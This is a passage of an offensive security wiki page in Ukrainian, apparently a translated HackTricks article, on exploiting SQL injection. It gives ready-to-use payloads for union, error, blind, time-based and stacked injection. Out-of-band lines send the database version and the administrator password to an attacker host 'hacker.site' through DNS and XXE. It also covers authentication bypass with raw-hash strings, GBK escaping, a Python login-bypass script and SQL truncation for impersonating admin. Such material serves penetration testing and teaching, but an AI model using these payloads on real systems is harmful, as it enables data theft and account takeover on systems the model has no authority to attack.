## –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ü—Ä–∏—Ö–æ–≤–∞–Ω–æ—ó –Ü–Ω'—î–∫—Ü—ñ—ó –Ω–∞ –û—Å–Ω–æ–≤—ñ –û–±'—î–¥–Ω–∞–Ω–Ω—è

–ö–æ–ª–∏ –≤–∏–≤—ñ–¥ –∑–∞–ø–∏—Ç—É –≤–∏–¥–∏–º–∏–π, –∞–ª–µ —ñ–Ω'—î–∫—Ü—ñ—è –Ω–∞ –æ—Å–Ω–æ–≤—ñ –æ–±'—î–¥–Ω–∞–Ω–Ω—è –∑–¥–∞—î—Ç—å—Å—è –Ω–µ–¥–æ—Å—è–∂–Ω–æ—é, —Ü–µ —Å–≤—ñ–¥—á–∏—Ç—å –ø—Ä–æ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å **–ø—Ä–∏—Ö–æ–≤–∞–Ω–æ—ó —ñ–Ω'—î–∫—Ü—ñ—ó –Ω–∞ –æ—Å–Ω–æ–≤—ñ –æ–±'—î–¥–Ω–∞–Ω–Ω—è**. –¶–µ–π —Å—Ü–µ–Ω–∞—Ä—ñ–π —á–∞—Å—Ç–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ —Å–∏—Ç—É–∞—Ü—ñ—ó —Å–ª—ñ–ø–æ—ó —ñ–Ω'—î–∫—Ü—ñ—ó. –©–æ–± –ø–µ—Ä–µ—Ç–≤–æ—Ä–∏—Ç–∏ —Å–ª—ñ–ø—É —ñ–Ω'—î–∫—Ü—ñ—é –Ω–∞ —ñ–Ω'—î–∫—Ü—ñ—é –Ω–∞ –æ—Å–Ω–æ–≤—ñ –æ–±'—î–¥–Ω–∞–Ω–Ω—è, –ø–æ—Ç—Ä—ñ–±–Ω–æ —Ä–æ–∑—Ä–æ–∑—É–º—ñ—Ç–∏ –≤–∏–∫–æ–Ω–∞–≤—á–∏–π –∑–∞–ø–∏—Ç –Ω–∞ –±–µ–∫–µ–Ω–¥—ñ.

–¶–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç–µ—Ö–Ω—ñ–∫ —Å–ª—ñ–ø–æ—ó —ñ–Ω'—î–∫—Ü—ñ—ó —Ä–∞–∑–æ–º —ñ–∑ —Ç–∞–±–ª–∏—Ü—è–º–∏ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–∏–º–∏ –¥–ª—è –≤–∞—à–æ—ó —Ü—ñ–ª—å–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –±–∞–∑–∞–º–∏ –¥–∞–Ω–∏—Ö (–°–£–ë–î). –î–ª—è —Ä–æ–∑—É–º—ñ–Ω–Ω—è —Ü–∏—Ö —Ç–∞–±–ª–∏—Ü—å –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –∫–æ–Ω—Å—É–ª—å—Ç—É–≤–∞—Ç–∏ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—é —Ü—ñ–ª—å–æ–≤–æ—ó –°–£–ë–î.

–ü—ñ—Å–ª—è —Ç–æ–≥–æ, —è–∫ –∑–∞–ø–∏—Ç –±—É–ª–æ –≤–∏–¥–æ–±—É—Ç–æ, –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –≤–∞—à–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∞–∫, —â–æ–± –±–µ–∑–ø–µ—á–Ω–æ –∑–∞–∫—Ä–∏—Ç–∏ –ø–æ—á–∞—Ç–∫–æ–≤–∏–π –∑–∞–ø–∏—Ç. –ü–æ–¥–∞–ª—å—à–µ, –¥–æ –≤–∞—à–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–æ–¥–∞—î—Ç—å—Å—è –æ–±'—î–¥–Ω–∞–Ω–∏–π –∑–∞–ø–∏—Ç, —â–æ —Å–ø—Ä–∏—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—é –Ω–æ–≤–æ—ó –¥–æ—Å—Ç—É–ø–Ω–æ—ó —ñ–Ω'—î–∫—Ü—ñ—ó –Ω–∞ –æ—Å–Ω–æ–≤—ñ –æ–±'—î–¥–Ω–∞–Ω–Ω—è.

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –±—ñ–ª—å—à –¥–µ—Ç–∞–ª—å–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –¥–∏–≤—ñ—Ç—å—Å—è –ø–æ–≤–Ω—É —Å—Ç–∞—Ç—Ç—é, –¥–æ—Å—Ç—É–ø–Ω—É –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º [Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f).

## –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ü–æ–º–∏–ª–∫–æ–≤–æ—ó –Ü–Ω'—î–∫—Ü—ñ—ó

–Ø–∫—â–æ –∑ —è–∫–æ—ó—Å—å –ø—Ä–∏—á–∏–Ω–∏ –≤–∏ **–Ω–µ –º–æ–∂–µ—Ç–µ** –ø–æ–±–∞—á–∏—Ç–∏ **–≤–∏–≤—ñ–¥** –∑–∞–ø–∏—Ç—É, –∞–ª–µ –≤–∏ –º–æ–∂–µ—Ç–µ **–ø–æ–±–∞—á–∏—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É**, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü—ñ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É –¥–ª—è **–µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó** –¥–∞–Ω–∏—Ö –∑ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö.\
–°–ª—ñ–¥—É—é—á–∏ –∞–Ω–∞–ª–æ–≥—ñ—á–Ω–æ–º—É –ø–æ—Ç–æ–∫—É, —è–∫ —É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –æ–±'—î–¥–Ω–∞–Ω–Ω—è, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–¥–∞–ª–æ –≤–∏—Ç—è–≥—Ç–∏ –ë–î.
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Å–ª—ñ–ø–æ–≥–æ SQLi

–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –±–∞—á–∏—Ç–∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏ –∑–∞–ø–∏—Ç—É –∞–±–æ –ø–æ–º–∏–ª–∫–∏, –∞–ª–µ –≤–∏ –º–æ–∂–µ—Ç–µ –≤—ñ–¥—Ä—ñ–∑–Ω–∏—Ç–∏, –∫–æ–ª–∏ –∑–∞–ø–∏—Ç –ø–æ–≤–µ—Ä—Ç–∞—î –≤—ñ–¥–ø–æ–≤—ñ–¥—å **true** –∞–±–æ **false**, –æ—Å–∫—ñ–ª—å–∫–∏ –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ —î —Ä—ñ–∑–Ω—ñ –≤–º—ñ—Å—Ç.\
–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü—ñ—î—é –ø–æ–≤–µ–¥—ñ–Ω–∫–æ—é, —â–æ–± –≤–∏—Ç—è–≥—Ç–∏ –¥–∞–Ω—ñ –∑ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö –ø–æ—Å–∏–º–≤–æ–ª—å–Ω–æ:
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Error Blind SQLi

–¶–µ **—Ç–æ–π —Å–∞–º–∏–π –≤–∏–ø–∞–¥–æ–∫, —â–æ –π —Ä–∞–Ω—ñ—à–µ**, –∞–ª–µ –∑–∞–º—ñ—Å—Ç—å —Ä–æ–∑—Ä—ñ–∑–Ω–µ–Ω–Ω—è –º—ñ–∂ –ø—Ä–∞–≤–∏–ª—å–Ω–æ—é/–Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ—é –≤—ñ–¥–ø–æ–≤—ñ–¥–¥—é –≤—ñ–¥ –∑–∞–ø–∏—Ç—É –≤–∏ –º–æ–∂–µ—Ç–µ **—Ä–æ–∑—Ä—ñ–∑–Ω–∏—Ç–∏ –º—ñ–∂** –ø–æ–º–∏–ª–∫–æ—é –≤ SQL-–∑–∞–ø–∏—Ç—ñ –∞–±–æ –Ω—ñ (–º–æ–∂–ª–∏–≤–æ, —á–µ—Ä–µ–∑ –∑–±—ñ–π HTTP-—Å–µ—Ä–≤–µ—Ä–∞). –¢–æ–º—É –≤ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –ø–æ–º–∏–ª–∫—É SQL –∫–æ–∂–Ω–æ–≥–æ —Ä–∞–∑—É, –∫–æ–ª–∏ –ø—Ä–∞–≤–∏–ª—å–Ω–æ –≤–≥–∞–¥—É—î—Ç–µ —Å–∏–º–≤–æ–ª:
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Time Based SQLi

–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É **–Ω–µ–º–∞—î** —Å–ø–æ—Å–æ–±—É **–≤—ñ–¥—Ä—ñ–∑–Ω–∏—Ç–∏** –≤—ñ–¥–ø–æ–≤—ñ–¥—å –∑–∞–ø–∏—Ç—É –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∫–æ–Ω—Ç–µ–∫—Å—Ç—É —Å—Ç–æ—Ä—ñ–Ω–∫–∏. –ü—Ä–æ—Ç–µ, –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ —Å—Ç–æ—Ä—ñ–Ω–∫—É **–∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏—Å—è –¥–æ–≤—à–µ**, —è–∫—â–æ –≤–≥–∞–¥–∞–Ω–∏–π —Å–∏–º–≤–æ–ª —î –ø—Ä–∞–≤–∏–ª—å–Ω–∏–º. –ú–∏ –≤–∂–µ –±–∞—á–∏–ª–∏ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É —É –¥—ñ—ó —Ä–∞–Ω—ñ—à–µ –¥–ª—è [–ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –Ω–∞—è–≤–Ω–æ—Å—Ç—ñ SQLi —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ](./#–ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è-–∑–∞-–¥–æ–ø–æ–º–æ–≥–æ—é-—á–∞—Å—É).
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## –°—Ç–µ–∫–æ–≤—ñ –∑–∞–ø–∏—Ç–∏

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Å—Ç–µ–∫–æ–≤—ñ –∑–∞–ø–∏—Ç–∏ –¥–ª—è **–≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫—ñ–ª—å–∫–æ—Ö –∑–∞–ø–∏—Ç—ñ–≤ –ø–æ—Å–ø—ñ–ª—å**. –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö –∑–∞–ø–∏—Ç—ñ–≤ **—Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏ –Ω–µ –ø–æ–≤–µ—Ä—Ç–∞—é—Ç—å—Å—è –¥–æ –¥–æ–¥–∞—Ç–∫—É**. –¢–æ–º—É —Ü—è —Ç–µ—Ö–Ω—ñ–∫–∞ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –∫–æ—Ä–∏—Å–Ω–∞ –≤—ñ–¥–Ω–æ—Å–Ω–æ **—Å–ª—ñ–ø–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π**, –¥–µ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥—Ä—É–≥–∏–π –∑–∞–ø–∏—Ç –¥–ª—è —Å–ø—Ä–æ–≤–æ–∫—É–≤–∞–Ω–Ω—è DNS-–∑–∞–ø–∏—Ç—É, —É–º–æ–≤–Ω–æ—ó –ø–æ–º–∏–ª–∫–∏ –∞–±–æ –∑–∞—Ç—Ä–∏–º–∫–∏ —á–∞—Å—É.

**Oracle** –Ω–µ –ø—ñ–¥—Ç—Ä–∏–º—É—î **—Å—Ç–µ–∫–æ–≤—ñ –∑–∞–ø–∏—Ç–∏**. **MySQL, Microsoft** —Ç–∞ **PostgreSQL** –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å —ó—Ö: `–ó–ê–ü–ò–¢-1-–¢–£–¢; –ó–ê–ü–ò–¢-2-–¢–£–¢`

## –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –ø–æ–∑–∞ –º–µ–∂–∞–º–∏ –∑–≤'—è–∑–∫—É

–Ø–∫—â–æ **–∂–æ–¥–µ–Ω —ñ–Ω—à–∏–π** –º–µ—Ç–æ–¥ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó **–Ω–µ –ø—Ä–∞—Ü—é—î**, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑—Ä–æ–±–∏—Ç–∏ —Ç–∞–∫, —â–æ–± **–±–∞–∑–∞ –¥–∞–Ω–∏—Ö –≤–∏—Ç—ñ–∫–∞–ª–∞** —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –Ω–∞ **–∑–æ–≤–Ω—ñ—à–Ω—ñ–π —Ö–æ—Å—Ç**, –∫–æ—Ç—Ä–∏–º –≤–∏ –∫–µ—Ä—É—î—Ç–µ. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —á–µ—Ä–µ–∑ DNS-–∑–∞–ø–∏—Ç–∏:
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### –í–∏–≤–µ–¥–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö –ø–æ–∑–∞ –º–µ–∂—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é XXE
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## –ê–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [SQLMap Cheetsheat](sqlmap/), —â–æ–± –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å SQLi –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é [**sqlmap**](https://github.com/sqlmapproject/sqlmap).

## –Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è —â–æ–¥–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—ó —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ—ó

–ú–∏ –≤–∂–µ –æ–±–≥–æ–≤–æ—Ä–∏–ª–∏ –≤—Å—ñ —Å–ø–æ—Å–æ–±–∏ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ SQL Injection. –ó–Ω–∞–π–¥—ñ—Ç—å –¥–µ—è–∫—ñ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ —Ö–∏—Ç—Ä–æ—â—ñ, –∑–∞–ª–µ–∂–Ω—ñ –≤—ñ–¥ —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ—ó –±–∞–∑–∏ –¥–∞–Ω–∏—Ö —É —Ü—ñ–π –∫–Ω–∏–∑—ñ:

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

–ê–±–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ **–±–∞–≥–∞—Ç–æ —Ö–∏—Ç—Ä–æ—â—ñ–≤ —â–æ–¥–æ: MySQL, PostgreSQL, Oracle, MSSQL, SQLite —Ç–∞ HQL –≤** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)



<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) - –Ω–∞–π–±—ñ–ª—å—à –≤–∞–∂–ª–∏–≤–∞ –ø–æ–¥—ñ—è –∑ –∫—ñ–±–µ—Ä–±–µ–∑–ø–µ–∫–∏ –≤ **–Ü—Å–ø–∞–Ω—ñ—ó** —Ç–∞ –æ–¥–Ω–∞ –∑ –Ω–∞–π–≤–∞–∂–ª–∏–≤—ñ—à–∏—Ö –≤ **–Ñ–≤—Ä–æ–ø—ñ**. –ó **–º—ñ—Å—ñ—î—é –ø—Ä–æ—Å—É–≤–∞–Ω–Ω—è —Ç–µ—Ö–Ω—ñ—á–Ω–∏—Ö –∑–Ω–∞–Ω—å**, —Ü–µ–π –∫–æ–Ω–≥—Ä–µ—Å —î –∫–∏–ø—É—á–æ—é —Ç–æ—á–∫–æ—é –∑—É—Å—Ç—Ä—ñ—á—ñ –¥–ª—è –ø—Ä–æ—Ñ–µ—Å—ñ–æ–Ω–∞–ª—ñ–≤ —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ–π —Ç–∞ –∫—ñ–±–µ—Ä–±–µ–∑–ø–µ–∫–∏ —É –∫–æ–∂–Ω—ñ–π –¥–∏—Å—Ü–∏–ø–ª—ñ–Ω—ñ.

{% embed url="https://www.rootedcon.com/" %}

## –û–±—Ö—ñ–¥ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó

–°–ø–∏—Å–æ–∫ —Å–ø—Ä–æ–± –æ–±—ñ–π—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å –≤—Ö–æ–¥—É:

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### –û–±—Ö—ñ–¥ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–∏—Ä–æ–≤–∏–Ω–Ω–æ–≥–æ —Ö–µ—à—É
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
–¶–µ–π –∑–∞–ø–∏—Ç –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –ø—Ä–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ MD5 –∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º true –¥–ª—è –æ–±—Ä–æ–±–∫–∏ –≤—Ö—ñ–¥–Ω–∏—Ö –¥–∞–Ω–∏—Ö —É –ø–µ—Ä–µ–≤—ñ—Ä—Ü—ñ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, —â–æ —Ä–æ–±–∏—Ç—å —Å–∏—Å—Ç–µ–º—É –≤—Ä–∞–∑–ª–∏–≤–æ—é –¥–æ SQL —ñ–Ω'—î–∫—Ü—ñ–π. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ, —Å—Ç–≤–æ—Ä—é—é—á–∏ –≤—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ, —è–∫—ñ, –ø—ñ—Å–ª—è —Ö–µ—à—É–≤–∞–Ω–Ω—è, –≤–∏—Ä–æ–±–ª—è—é—Ç—å –Ω–µ–æ—á—ñ–∫—É–≤–∞–Ω—ñ —á–∞—Å—Ç–∏–Ω–∏ SQL –∫–æ–º–∞–Ω–¥, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø—É.
```sql
md5("ffifdyop", true) = 'or'6ÔøΩ]ÔøΩÔøΩ!r,ÔøΩÔøΩbÔøΩ
sha1("3fDf ", true) = QÔøΩu'='ÔøΩ@ÔøΩ[ÔøΩtÔøΩ- oÔøΩÔøΩ_-!
```
### –û–±—Ö—ñ–¥ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤–Ω–µ—Å–µ–Ω–æ–≥–æ —Ö–µ—à—É
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**–†–µ–∫–æ–º–µ–Ω–¥–æ–≤–∞–Ω–∏–π —Å–ø–∏—Å–æ–∫**:

–í–∏ –ø–æ–≤–∏–Ω–Ω—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∫–æ–∂–µ–Ω —Ä—è–¥–æ–∫ —Å–ø–∏—Å–∫—É —è–∫ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —ñ –∑–∞–≤–∂–¥–∏ —è–∫ –ø–∞—Ä–æ–ª—å: _**Pass1234.**_\
_(–¶—ñ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∞–∫–æ–∂ –≤–∫–ª—é—á–µ–Ω—ñ –≤ –≤–µ–ª–∏–∫–∏–π —Å–ø–∏—Å–æ–∫, –∑–≥–∞–¥–∞–Ω–∏–π –≤ –ø–æ—á–∞—Ç–∫—É —Ü—å–æ–≥–æ —Ä–æ–∑–¥—ñ–ª—É)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### GBK –ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è Bypass

–Ø–ö–©–û ' –µ–∫—Ä–∞–Ω—É—î—Ç—å—Å—è, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ %A8%27, —ñ –∫–æ–ª–∏ ' –µ–∫—Ä–∞–Ω—É—î—Ç—å—Å—è, –±—É–¥–µ —Å—Ç–≤–æ—Ä–µ–Ω–æ: 0xA80x5c0x27 (_‚ïò'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
–°–∫—Ä–∏–ø—Ç Python:
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### –ü–æ–ª—ñ–≥–ª–æ—Ç–Ω–∏–π —ñ–Ω'—î–∫—Ü—ñ–π (–±–∞–≥–∞—Ç–æ–∫–æ–Ω—Ç–µ–∫—Å—Ç–Ω–∏–π)
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## –û–ø–µ—Ä–∞—Ç–æ—Ä –≤—Å—Ç–∞–≤–∫–∏

### –ó–º—ñ–Ω–∞ –ø–∞—Ä–æ–ª—è —ñ—Å–Ω—É—é—á–æ–≥–æ –æ–±'—î–∫—Ç—É/–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞

–î–ª—è —Ü—å–æ–≥–æ –≤–∞–º —Å–ª—ñ–¥ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–∏–π –æ–±'—î–∫—Ç –∑ —ñ–º–µ–Ω–µ–º "–≥–æ–ª–æ–≤–Ω–æ–≥–æ –æ–±'—î–∫—Ç—É"** (—ñ–º–æ–≤—ñ—Ä–Ω–æ **–∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä** —É –≤–∏–ø–∞–¥–∫—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤), –∑–º—ñ–Ω–∏–≤—à–∏ —â–æ—Å—å:

* –°—Ç–≤–æ—Ä—ñ—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑ —ñ–º–µ–Ω–µ–º: **AdMIn** (–∑ –≤–µ–ª–∏–∫–∏–º–∏ —Ç–∞ –º–∞–ª–∏–º–∏ –ª—ñ—Ç–µ—Ä–∞–º–∏)
* –°—Ç–≤–æ—Ä—ñ—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑ —ñ–º–µ–Ω–µ–º: **admin=**
* **–ê—Ç–∞–∫–∞ –Ω–∞ –æ–±—Ä—ñ–∑–∞–Ω–Ω—è SQL** (–∫–æ–ª–∏ —î –ø–µ–≤–Ω–∏–π **–æ–±–º–µ–∂–µ–Ω–Ω—è –¥–æ–≤–∂–∏–Ω–∏** –¥–ª—è —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∞–±–æ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—ó –ø–æ—à—Ç–∏) --> –°—Ç–≤–æ—Ä—ñ—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑ —ñ–º–µ–Ω–µ–º: **admin \[–±–∞–≥–∞—Ç–æ –ø—Ä–æ–±—ñ–ª—ñ–≤] a**

#### –ê—Ç–∞–∫–∞ –Ω–∞ –æ–±—Ä—ñ–∑–∞–Ω–Ω—è SQL

–Ø–∫—â–æ –±–∞–∑–∞ –¥–∞–Ω–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–∞ —ñ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–∞ –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Å–∏–º–≤–æ–ª—ñ–≤ –¥–ª—è —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, 30, —ñ –≤–∏ —Ö–æ—á–µ—Ç–µ –≤–∏–¥–∞—ó—Ç—å —Å–µ–±–µ –∑–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ **–∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä**, —Å–ø—Ä–æ–±—É–π—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ "_admin \[30 –ø—Ä–æ–±—ñ–ª—ñ–≤] a_" —Ç–∞ –±—É–¥—å-—è–∫–∏–π –ø–∞—Ä–æ–ª—å.

